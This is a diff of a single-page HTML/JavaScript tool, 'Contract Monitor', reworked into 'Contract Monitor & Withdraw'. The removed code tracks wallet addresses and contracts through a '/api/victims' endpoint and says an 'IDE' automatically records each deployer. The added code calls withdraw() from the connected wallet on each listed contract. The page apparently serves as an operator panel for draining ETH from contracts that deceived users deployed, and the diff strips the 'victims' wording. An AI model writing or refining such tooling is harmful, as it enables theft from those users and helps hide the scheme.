@@ -3,197 +3,149 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Contract Monitor</title>
+  <title>Contract Monitor & Withdraw</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
   <style>
     :root{--bg:#0d0d0f;--bg2:#141418;--border:#2a2a32;--text:#e8e8ed;--muted:#888894;--accent:#7c6cff;--success:#4ade80;--danger:#ff5c5c}
     *{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:2rem}
-    .container{max-width:900px;margin:0 auto}h1{font-family:'Space Grotesk',sans-serif;font-size:1.8rem;margin-bottom:.5rem;text-align:center}
-    .sub{text-align:center;color:var(--muted);margin-bottom:2rem;font-size:.9rem}
-    .sbox{display:flex;gap:.5rem;margin-bottom:1.5rem}.inp{flex:1;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:.7rem 1rem;border-radius:8px;font-size:.9rem}.inp:focus{outline:none;border-color:var(--accent)}
-    .btn{padding:.7rem 1.5rem;border:none;border-radius:8px;font-weight:600;cursor:pointer;transition:all .15s;font-size:.9rem}.btn-p{background:var(--accent);color:#fff}.btn-p:hover{filter:brightness(1.1)}.btn-s{background:var(--success);color:var(--bg)}.btn-sm{padding:.4rem .8rem;font-size:.8rem}
-    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1.5rem}.stat{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem;text-align:center}.sv{font-family:'Space Grotesk',sans-serif;font-size:1.5rem;font-weight:700;color:var(--accent)}.sl{font-size:.8rem;color:var(--muted);margin-top:.3rem}
-    .clist{display:flex;flex-direction:column;gap:.5rem}.citem{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem}
-    .caddr{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--accent);cursor:pointer}.caddr:hover{text-decoration:underline}
-    .bal{font-family:'JetBrains Mono',monospace;font-size:.9rem;font-weight:600}.bal.has{color:var(--success)}.bal.no{color:var(--muted)}
-    .tag{display:inline-block;padding:.15rem .5rem;border-radius:4px;font-size:.7rem;font-weight:600}.tag-eth{background:rgba(74,222,128,.15);color:var(--success)}.tag-zero{background:rgba(136,136,148,.15);color:var(--muted)}
-    .log{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem;margin-top:1.5rem;max-height:200px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:.75rem}
-    .le{padding:.2rem 0;border-bottom:1px solid rgba(255,255,255,.05)}.lt{color:var(--muted);margin-right:.5rem}.li{color:var(--muted)}.ls{color:var(--success)}.le2{color:var(--danger)}
+    .container{max-width:900px;margin:0 auto}
+    h1{text-align:center;font-size:1.5rem;margin-bottom:.5rem}
+    .sub{text-align:center;color:var(--muted);margin-bottom:2rem;font-size:.85rem}
+    .card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.2rem;margin-bottom:1rem}
+    .card-title{font-weight:600;margin-bottom:.8rem;display:flex;justify-content:space-between;align-items:center}
+    .btn{padding:.6rem 1.2rem;border:none;border-radius:6px;font-weight:600;cursor:pointer;transition:all .15s;font-size:.85rem}
+    .btn-p{background:var(--accent);color:#fff}.btn-p:hover{filter:brightness(1.1)}
+    .btn-s{background:var(--success);color:var(--bg)}.btn-s:hover{filter:brightness(1.1)}
+    .btn-d{background:var(--danger);color:#fff}.btn-d:hover{filter:brightness(1.1)}
+    .btn-sm{padding:.35rem .7rem;font-size:.75rem}
+    .row{display:flex;gap:.5rem;align-items:center;margin-bottom:.5rem;flex-wrap:wrap}
+    .mono{font-family:'JetBrains Mono',monospace;font-size:.8rem}
+    .addr{color:var(--accent);cursor:pointer}.addr:hover{text-decoration:underline}
+    .bal{font-weight:600;font-size:.9rem}.bal.has{color:var(--success)}.bal.no{color:var(--muted)}
+    .tag{display:inline-block;padding:.1rem .4rem;border-radius:3px;font-size:.65rem;font-weight:600}
+    .tag-ok{background:rgba(74,222,128,.15);color:var(--success)}
+    .tag-no{background:rgba(136,136,148,.15);color:var(--muted)}
+    .status{padding:.4rem .8rem;border-radius:4px;font-size:.8rem;margin-top:.5rem}
+    .status.ok{background:rgba(74,222,128,.1);color:var(--success)}
+    .status.err{background:rgba(255,92,92,.1);color:var(--danger)}
+    .status.info{background:rgba(124,108,255,.1);color:var(--accent)}
+    .log{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:.8rem;margin-top:1rem;max-height:150px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:.7rem}
+    .le{padding:.15rem 0}.lt{color:var(--muted);margin-right:.5rem}
     .empty{text-align:center;color:var(--muted);padding:2rem;font-size:.9rem}
-    .info-box{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem;margin-bottom:1rem;font-size:.8rem;color:var(--muted)}
+    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1rem}
+    .stat{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem;text-align:center}
+    .sv{font-size:1.5rem;font-weight:700;color:var(--accent)}.sl{font-size:.8rem;color:var(--muted);margin-top:.3rem}
+    .inp{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:.6rem;border-radius:6px;font-size:.85rem}
+    .inp:focus{outline:none;border-color:var(--accent)}
+    .export-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:.8rem;font-family:'JetBrains Mono',monospace;font-size:.75rem;max-height:100px;overflow-y:auto;word-break:break-all;cursor:pointer}
+    .export-box:hover{border-color:var(--accent)}
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Contract Monitor</h1>
-    <p class="sub">Track deployed contracts and monitor ETH balances</p>
-    <div class="info-box"><strong style="color:var(--text)">How to use:</strong><br>Enter a wallet address (deployer) to see all contracts deployed by that address.</div>
-    <div class="sbox"><input type="text" id="deployerAddr" class="inp" placeholder="0x... Wallet address"><button class="btn btn-p" id="btnScan">Scan</button></div>
-    <div style="display:flex;align-items:center;gap:.5rem;margin-bottom:1rem;font-size:.85rem;color:var(--muted)"><input type="checkbox" id="autoRefresh" checked><label for="autoRefresh">Auto-refresh every 30 seconds</label></div>
-    <div class="stats"><div class="stat"><div class="sv" id="totalC">0</div><div class="sl">Contracts</div></div><div class="stat"><div class="sv" id="totalB">0</div><div class="sl">Total ETH</div></div><div class="stat"><div class="sv" id="withEth">0</div><div class="sl">With ETH</div></div></div>
-    <div class="clist" id="cList"><div class="empty">Enter a wallet address and click Scan</div></div>
-    <div class="log" id="logOut"></div>
+    <h1>Contract Monitor & Withdraw</h1>
+    <p class="sub">Track deployed contracts and withdraw ETH</p>
+    <div class="card">
+      <div class="card-title">Your Wallet <button class="btn btn-p btn-sm" onclick="connectWallet()">Connect</button></div>
+      <div class="row"><span class="mono" id="walletAddr">Not connected</span><span class="bal" id="walletBal" style="margin-left:auto">-- ETH</span></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Add Contract</div>
+      <div class="row">
+        <input type="text" id="newAddr" class="inp" placeholder="0x... Contract address" style="flex:1">
+        <input type="text" id="newName" class="inp" placeholder="Name" style="width:120px">
+        <button class="btn btn-p" onclick="addContract()">Add</button>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Share Data Between Browsers</div>
+      <p style="font-size:.8rem;color:var(--muted);margin-bottom:.8rem">Copy this data and paste in another browser to see the same contracts:</p>
+      <div class="export-box" id="exportData" onclick="copyExport()">Click to copy</div>
+      <div class="row" style="margin-top:.8rem">
+        <input type="text" id="importData" class="inp" placeholder="Paste data from another browser" style="flex:1">
+        <button class="btn btn-s" onclick="importData()">Import</button>
+      </div>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="sv" id="totalC">0</div><div class="sl">Contracts</div></div>
+      <div class="stat"><div class="sv" id="totalE">0</div><div class="sl">Total ETH</div></div>
+      <div class="stat"><div class="sv" id="withE">0</div><div class="sl">With ETH</div></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Deployed Contracts <button class="btn btn-sm" style="background:var(--bg);border:1px solid var(--border);color:var(--muted)" onclick="refreshAll()">Refresh</button></div>
+      <div id="contractList"><div class="empty">No contracts added yet</div></div>
+    </div>
+    <div class="log" id="logOutput"></div>
   </div>
   <!-- PLACEHOLDER_SCRIPT -->
   <script>
-    let provider,contracts=[],logs=[];
-    const STORAGE_KEY='etherlab_users';
-    const NETWORKS={1:{name:'Ethereum Mainnet',rpc:'https://eth.llamarpc.com',api:'https://api.etherscan.io/api',explorer:'https://etherscan.io'},11155111:{name:'Sepolia Testnet',rpc:'https://rpc.sepolia.org',api:'https://api-sepolia.etherscan.io/api',explorer:'https://sepolia.etherscan.io'}};
-    let currentNetwork=NETWORKS[11155111];
+    const STORAGE_KEY='etherlab_contracts';
+    let provider,signer,userAddr,contracts=[];
 
-    function log(m,t){t=t||'info';logs.push({time:new Date().toLocaleTimeString(),msg:m,type:t});renderLogs()}
-    function renderLogs(){document.getElementById('logOut').innerHTML=logs.slice(-30).map(e=>`<div class="le"><span class="lt">${e.time}</span><span class="l${e.type==='success'?'s':e.type==='error'?'e2':'i'}">${e.msg}</span></div>`).join('');document.getElementById('logOut').scrollTop=99999}
+    function log(msg,type){const el=document.getElementById('logOutput');const time=new Date().toLocaleTimeString();el.innerHTML+=`<div class="le"><span class="lt">${time}</span><span style="color:${type==='success'?'var(--success)':type==='error'?'var(--danger)':'var(--muted)'}">${msg}</span></div>`;el.scrollTop=99999}
+    function loadContracts(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY)||'[]')}catch{return[]}}
+    function saveContracts(){localStorage.setItem(STORAGE_KEY,JSON.stringify(contracts));updateExport()}
+    function updateExport(){document.getElementById('exportData').textContent=JSON.stringify(contracts)}
+    function copyExport(){navigator.clipboard.writeText(JSON.stringify(contracts));log('Data copied! Paste in another browser.','success')}
+    function importData(){try{const data=JSON.parse(document.getElementById('importData').value);if(Array.isArray(data)){contracts=data;saveContracts();renderContracts();refreshAll();log('Imported '+data.length+' contract(s)','success')}else{alert('Invalid data')}}catch(e){alert('Invalid JSON')}}
 
-    async function loadData(){
-      // Try server first (if available)
+    function addContract(){
+      const addr=document.getElementById('newAddr').value.trim();
+      const name=document.getElementById('newName').value.trim()||'Contract';
+      if(!addr||!addr.startsWith('0x')){alert('Enter valid address');return}
+      if(contracts.find(c=>c.address.toLowerCase()===addr.toLowerCase())){alert('Already added');return}
+      contracts.push({address:addr,name:name,addedAt:new Date().toLocaleString()});
+      saveContracts();document.getElementById('newAddr').value='';document.getElementById('newName').value='';
+      log('Added: '+name+' ('+addr.slice(0,6)+'...'+addr.slice(-4)+')','success');
+      renderContracts();refreshAll();
+    }
+
+    function removeContract(addr){if(!confirm('Remove?'))return;contracts=contracts.filter(c=>c.address!==addr);saveContracts();log('Removed','info');renderContracts()}
+
+    function renderContracts(){
+      const el=document.getElementById('contractList');
+      document.getElementById('totalC').textContent=contracts.length;
+      if(!contracts.length){el.innerHTML='<div class="empty">No contracts added yet</div>';return}
+      el.innerHTML=contracts.map(c=>`<div class="card" style="margin-bottom:.5rem"><div class="card-title"><span>${c.name} ${c.balance>0?'<span class="tag tag-ok">HAS ETH</span>':'<span class="tag tag-no">0 ETH</span>'}</span><button class="btn btn-d btn-sm" onclick="removeContract('${c.address}')">Remove</button></div><div class="row"><span class="addr mono" onclick="navigator.clipboard.writeText('${c.address}');this.textContent='Copied!'">${c.address}</span></div><div class="row"><span class="bal ${c.balance>0?'has':'no'}">${(c.balance||0).toFixed(6)} ETH</span><span style="margin-left:auto;display:flex;gap:.5rem"><button class="btn btn-s btn-sm" onclick="withdrawFrom('${c.address}')">Withdraw</button><button class="btn btn-sm" style="background:var(--bg);border:1px solid var(--border);color:var(--muted)" onclick="window.open('https://sepolia.etherscan.io/address/${c.address}','_blank')">Explorer</button></span></div><div class="status info" id="status-${c.address}" style="display:none"></div></div>`).join('');
+    }
+
+    async function refreshAll(){
+      if(!provider)provider=new ethers.JsonRpcProvider('https://rpc.sepolia.org');
+      let total=0,withE=0;
+      for(const c of contracts){try{const bal=await provider.getBalance(c.address);c.balance=parseFloat(ethers.formatEther(bal));total+=c.balance;if(c.balance>0)withE++}catch{c.balance=0}}
+      document.getElementById('totalE').textContent=total.toFixed(4);document.getElementById('withE').textContent=withE;
+      saveContracts();renderContracts();
+    }
+
+    async function connectWallet(){
+      if(!window.ethereum){alert('Install MetaMask!');return}
+      try{const accs=await window.ethereum.request({method:'eth_requestAccounts'});provider=new ethers.BrowserProvider(window.ethereum);signer=await provider.getSigner();userAddr=accs[0];
+      document.getElementById('walletAddr').textContent=userAddr.slice(0,6)+'...'+userAddr.slice(-4);
+      const balance=await provider.getBalance(userAddr);document.getElementById('walletBal').textContent=parseFloat(ethers.formatEther(balance)).toFixed(4)+' ETH';
+      log('Connected: '+userAddr.slice(0,6)+'...'+userAddr.slice(-4),'success')}catch(e){log('Error: '+e.message,'error')}
+    }
+
+    async function withdrawFrom(contractAddr){
+      if(!signer){alert('Connect wallet first!');return}
+      const statusEl=document.getElementById('status-'+contractAddr);statusEl.style.display='block';statusEl.className='status info';statusEl.textContent='Checking balance...';
       try{
-        const r=await fetch('/api/victims');
-        if(r.ok){
-          const data=await r.json();
-          if(data&&Object.keys(data).length>0){
-            log('Loaded from server: '+Object.keys(data).length+' user(s)','success');
-            return data;
-          }
-        }
-      }catch(e){}
-      
-      // Try localStorage
-      try{
-        const local=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');
-        if(Object.keys(local).length>0){
-          log('Loaded from local storage: '+Object.keys(local).length+' user(s)','info');
-          return local;
-        }
-      }catch(e){}
-      
-      log('No data found. Add users manually or deploy contracts on IDE.','warn');
-      return{};
-    }
-    async function saveData(data){try{await fetch('/api/victims',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})}catch(e){}localStorage.setItem(STORAGE_KEY,JSON.stringify(data))}
-    function loadDataSync(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}')}catch{return{}}}
-
-    async function addUser(){
-      const addr=prompt('Enter wallet address:');if(!addr)return;
-      const name=prompt('Contract name:')||'Unknown';
-      const contractAddr=prompt('Contract address:')||'';
-      
-      // Try server first
-      try{
-        const r=await fetch('/api/victims/add',{
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({wallet:addr,contractName:name,contractAddr:contractAddr})
-        });
-        const data=await r.json();
-        if(data.success){
-          log('Added: '+addr.slice(0,6)+'...'+addr.slice(-4),'success');
-          showUsers();
-          return;
-        }
-      }catch(e){}
-      
-      // Fallback to localStorage
-      let users=loadDataSync();
-      if(!users[addr])users[addr]={firstSeen:new Date().toLocaleString(),contracts:[]};
-      if(contractAddr&&!users[addr].contracts.some(c=>c.address.toLowerCase()===contractAddr.toLowerCase())){
-        users[addr].contracts.push({name:name,address:contractAddr,deployedAt:new Date().toLocaleString()});
-      }
-      users[addr].lastSeen=new Date().toLocaleString();
-      localStorage.setItem(STORAGE_KEY,JSON.stringify(users));
-      log('Added (local): '+addr.slice(0,6)+'...'+addr.slice(-4),'success');
-      showUsers();
+        const balance=await provider.getBalance(contractAddr);const eth=parseFloat(ethers.formatEther(balance));
+        if(eth<=0){statusEl.className='status err';statusEl.textContent='No ETH to withdraw';return}
+        statusEl.textContent='Withdrawing '+eth.toFixed(6)+' ETH...';
+        const abi=[{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+        const contract=new ethers.Contract(contractAddr,abi,signer);
+        const tx=await contract.withdraw();
+        statusEl.textContent='Tx sent: '+tx.hash.slice(0,10)+'...';log('Withdraw tx: '+tx.hash,'info');
+        await tx.wait();
+        statusEl.className='status ok';statusEl.textContent='Withdrawn! '+eth.toFixed(6)+' ETH';
+        log('Withdrawn '+eth.toFixed(6)+' ETH','success');
+        setTimeout(refreshAll,2000);
+      }catch(e){statusEl.className='status err';statusEl.textContent='Error: '+e.message.slice(0,50);log('Error: '+e.message,'error')}
     }
 
-    async function removeUser(addr){if(!confirm('Remove?'))return;try{const users=await loadData();delete users[addr];await saveData(users)}catch(e){let u=loadDataSync();delete u[addr];localStorage.setItem(STORAGE_KEY,JSON.stringify(u))}log('Removed','info');showUsers()}
-
-    // PLACEHOLDER_SHOW
-
-    async function showUsers(){
-      const users=await loadData();
-      const el=document.getElementById('cList');
-      const entries=Object.entries(users);
-      
-      log('Found '+entries.length+' user(s)','info');
-      
-      if(!entries.length){
-        el.innerHTML=`<div class="empty">
-          <p style="margin-bottom:1rem">No users found.</p>
-          <button class="btn btn-p" onclick="addUser()" style="margin-bottom:1rem">+ Add User Manually</button>
-          <div style="text-align:left;font-size:.8rem;color:var(--muted);max-width:400px;margin:0 auto">
-            <p><strong>How to add users:</strong></p>
-            <ol style="padding-left:1.5rem;margin-top:.5rem">
-              <li>Click "+ Add User Manually" above</li>
-              <li>Enter the wallet address that deployed the contract</li>
-              <li>Enter the contract name and address</li>
-            </ol>
-            <p style="margin-top:1rem"><strong>Or deploy a contract on the IDE:</strong></p>
-            <p>The IDE will automatically save the deployer's address.</p>
-          </div>
-        </div>`;
-        return;
-      }
-
-      let html='<div style="margin-bottom:1rem"><button class="btn btn-p btn-sm" onclick="addUser()">+ Add User</button></div>';
-      entries.forEach(([wallet,data])=>{
-        const cnt=data.contracts?data.contracts.length:0;
-        html+=`<div class="citem" style="flex-direction:column;align-items:flex-start">
-          <div style="display:flex;justify-content:space-between;width:100%;margin-bottom:.5rem">
-            <div>
-              <div style="font-weight:600;font-size:.95rem">User: ${wallet.slice(0,6)}...${wallet.slice(-4)}</div>
-              <div style="font-size:.75rem;color:var(--muted);margin-top:.3rem">First: ${data.firstSeen} | Last: ${data.lastSeen} | ${cnt} contract(s)</div>
-            </div>
-            <div style="display:flex;gap:.5rem">
-              <button class="btn btn-p btn-sm" onclick="scanWallet('${wallet}')">Scan</button>
-              <button class="btn btn-s btn-sm" onclick="navigator.clipboard.writeText('${wallet}')">Copy</button>
-              <button class="btn btn-sm" style="background:var(--danger);color:#fff" onclick="removeUser('${wallet}')">Remove</button>
-            </div>
-          </div>`;
-        
-        if(data.contracts&&data.contracts.length){
-          html+='<div style="width:100%;padding-left:1rem;border-left:2px solid var(--border)">';
-          data.contracts.forEach(c=>{
-            html+=`<div style="display:flex;justify-content:space-between;align-items:center;padding:.3rem 0;font-size:.8rem">
-              <div>
-                <span style="color:var(--muted)">${c.name}</span> 
-                <span class="caddr" onclick="navigator.clipboard.writeText('${c.address}');this.textContent='Copied!'">${c.address}</span>
-              </div>
-              <div style="display:flex;gap:.3rem">
-                <button class="btn btn-s btn-sm" onclick="window.open('withdraw.html?contract=${c.address}','_blank')" style="font-size:.7rem;padding:.2rem .5rem">Withdraw</button>
-                <button class="btn btn-p btn-sm" onclick="window.open('${currentNetwork.explorer}/address/${c.address}','_blank')" style="font-size:.7rem;padding:.2rem .5rem">Explorer</button>
-              </div>
-            </div>`;
-          });
-          html+='</div>';
-        }
-        html+='</div>';
-      });
-      el.innerHTML=html;
-    }
-
-    async function scanWallet(w){document.getElementById('deployerAddr').value=w;await scan()}
-
-    async function scan(){
-      const d=document.getElementById('deployerAddr').value.trim();if(!d){alert('Enter a wallet address!');return}
-      log('Scanning: '+d.slice(0,6)+'...'+d.slice(-4),'info');
-      try{if(window.ethereum){const p=new ethers.BrowserProvider(window.ethereum);const net=await p.getNetwork();const cid=Number(net.chainId);if(NETWORKS[cid])currentNetwork=NETWORKS[cid];log('Network: '+currentNetwork.name,'info')}}catch(e){}
-      try{const url=currentNetwork.api+'?module=account&action=txlistinternal&address='+d+'&startblock=0&endblock=99999999&sort=desc&apikey=YourApiKeyToken';const r=await fetch(url);const data=await r.json();if(data.status==='1'&&data.result){contracts=[];const seen=new Set();for(const tx of data.result){if(tx.contractAddress&&!seen.has(tx.contractAddress.toLowerCase())){seen.add(tx.contractAddress.toLowerCase());contracts.push({address:tx.contractAddress,block:tx.blockNumber,time:new Date(parseInt(tx.timeStamp)*1000).toLocaleString()})}}log('Found '+contracts.length+' contracts','success')}}catch(e){log('API Error: '+e.message,'error')}
-      if(!contracts.length){log('No contracts found via API, showing saved data','warn');showUsers()}else{await refresh();render()}
-    }
-
-    async function refresh(){if(!provider)provider=new ethers.JsonRpcProvider(currentNetwork.rpc);let total=0,withE=0;for(const c of contracts){try{const b=await provider.getBalance(c.address);c.bal=parseFloat(ethers.formatEther(b));total+=c.bal;if(c.bal>0)withE++}catch{c.bal=0}}document.getElementById('totalC').textContent=contracts.length;document.getElementById('totalB').textContent=total.toFixed(4);document.getElementById('withEth').textContent=withE}
-
-    function render(){const el=document.getElementById('cList');if(!contracts.length){showUsers();return}contracts.sort((a,b)=>(b.bal||0)-(a.bal||0));el.innerHTML=contracts.map((c,i)=>`<div class="citem"><div style="flex:1"><div style="font-weight:600;font-size:.95rem">Contract #${i+1} ${c.bal>0?'<span class="tag tag-eth">HAS ETH</span>':'<span class="tag tag-zero">0 ETH</span>'}</div><div class="caddr" onclick="navigator.clipboard.writeText('${c.address}');this.textContent='Copied!'">${c.address}</div><div style="font-size:.75rem;color:var(--muted);margin-top:.3rem">Block: ${c.block} | ${c.time}</div></div><div style="display:flex;gap:.5rem;align-items:center"><span class="bal ${c.bal>0?'has':'no'}">${(c.bal||0).toFixed(6)} ETH</span><button class="btn btn-s btn-sm" onclick="window.open('withdraw.html?contract=${c.address}','_blank')">Withdraw</button><button class="btn btn-p btn-sm" onclick="window.open('${currentNetwork.explorer}/address/${c.address}','_blank')">Explorer</button></div></div>`).join('')}
-
-    let rt;function startRT(){rt=setInterval(async()=>{if(contracts.length){await refresh();render();log('Auto-refreshed','info')}},30000)}
-    document.getElementById('btnScan').addEventListener('click',scan);
-    document.getElementById('autoRefresh').addEventListener('change',e=>{if(e.target.checked){startRT();log('Auto-refresh ON','info')}else{if(rt)clearInterval(rt);log('Auto-refresh OFF','info')}});
-    provider=new ethers.JsonRpcProvider(currentNetwork.rpc);
-    startRT();
-    // Auto-load data on page load
-    showUsers().then(()=>{
-      log('Monitor ready - '+currentNetwork.name,'info');
-    });
+    contracts=loadContracts();updateExport();renderContracts();
+    log('Monitor loaded. Add contracts or import data from another browser.','info');
   </script>
 </body>
 </html>
